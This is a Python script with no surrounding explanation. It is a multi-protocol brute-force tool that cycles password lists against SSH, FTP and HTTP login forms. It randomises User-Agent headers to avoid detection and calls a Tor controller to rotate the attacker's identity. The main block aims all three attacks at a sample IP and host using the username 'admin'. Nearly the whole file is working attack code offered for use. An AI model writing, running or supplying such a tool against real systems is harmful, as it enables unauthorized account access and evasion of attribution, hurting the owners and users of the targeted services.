import paramiko
import ftplib
import requests
from fake_useragent import UserAgent
from stem.control import Controller

def brute_force_ssh(target, username, password_list):
    """Brute-force SSH login"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in password_list:
        try:
            ssh.connect(target, username=username, password=password, timeout=3)
            print(f"[+] SSH Success: {username}:{password}")
            ssh.close()
            return password
        except paramiko.AuthenticationException:
            print(f"[-] SSH Failed: {username}:{password}")
        except Exception as e:
            print(f"[!] SSH Error: {e}")
    
    return None

def brute_force_ftp(target, username, password_list):
    """Brute-force FTP login"""
    for password in password_list:
        try:
            ftp = ftplib.FTP(target)
            ftp.login(username, password)
            print(f"[+] FTP Success: {username}:{password}")
            ftp.quit()
            return password
        except ftplib.error_perm:
            print(f"[-] FTP Failed: {username}:{password}")
        except Exception as e:
            print(f"[!] FTP Error: {e}")
    
    return None

def brute_force_http(url, username, password_list):
    """Brute-force HTTP login form"""
    ua = UserAgent()
    headers = {"User-Agent": ua.random}
    
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data, headers=headers)
        
        if "incorrect" not in response.text.lower():
            print(f"[+] HTTP Success: {username}:{password}")
            return password
        else:
            print(f"[-] HTTP Failed: {username}:{password}")
    
    return None

def use_tor():
    """Switch IP using Tor"""
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='your_tor_password')
        controller.signal(2)  # Signal new identity
        print("[+] New Tor Identity Generated")

if __name__ == "__main__":
    target_ip = "192.168.1.1"
    username = "admin"
    password_list = ["password", "123456", "admin123", "qwerty"]
    
    print("[*] Starting SSH Brute Force...")
    brute_force_ssh(target_ip, username, password_list)
    
    print("[*] Starting FTP Brute Force...")
    brute_force_ftp(target_ip, username, password_list)
    
    print("[*] Starting HTTP Brute Force...")
    brute_force_http("http://target.com/login", username, password_list)
    
    print("[*] Changing Identity Using Tor...")
    use_tor()
